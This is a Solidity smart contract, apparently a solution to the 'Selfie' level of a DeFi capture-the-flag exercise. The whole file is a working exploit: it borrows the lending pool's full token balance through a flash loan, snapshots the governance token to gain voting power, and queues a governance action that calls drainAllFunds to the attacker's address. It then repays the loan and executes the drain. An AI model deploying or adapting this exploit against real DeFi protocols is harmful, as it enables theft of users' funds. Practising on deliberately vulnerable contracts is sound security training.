pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract SelfieAttack {
  address private _flash;
  address private _gov;
  address private _attacker;
  address private _token;
  uint256 private _actionId;

  constructor(address flash, address gov, address attacker, address token) {
    _flash = flash;
    _gov = gov;
    _attacker = attacker;
    _token = token;
  }

  function attack() external {
    (bool isBalanceOf, bytes memory result) = _token.call(
      abi.encodeWithSignature("balanceOf(address)", _flash)
    );

    require(isBalanceOf, "isBalanceOf");

    (uint256 amount) = abi.decode(result, (uint256));

    (bool isFlash, ) = _flash.call(
      abi.encodeWithSignature("flashLoan(uint256)", amount)
    );

    require(isFlash, "isFlash");
  }

  function receiveTokens(address asdf, uint256 amount) external {
    _token.call(
      abi.encodeWithSignature("snapshot()")
    );

    (bool isQueue, bytes memory queueResult) = _gov.call(
      abi.encodeWithSignature("queueAction(address,bytes,uint256)", 
        _flash,
        abi.encodeWithSignature("drainAllFunds(address)", _attacker),
        0
      )
    );

    (uint256 actionId) = abi.decode(queueResult, (uint256));
    _actionId = actionId;

    require(isQueue, "isQueue");

    (bool isSentBack, ) = _token.call(
      abi.encodeWithSignature("transfer(address,uint256)", _flash, amount)
    );

    require(isSentBack, "isSentBack");
  }

  function execute() external {
    (bool isExecute, ) = _gov.call(
      abi.encodeWithSignature("executeAction(uint256)", _actionId)
    );

    require(isExecute, "isExecute");
  }
}
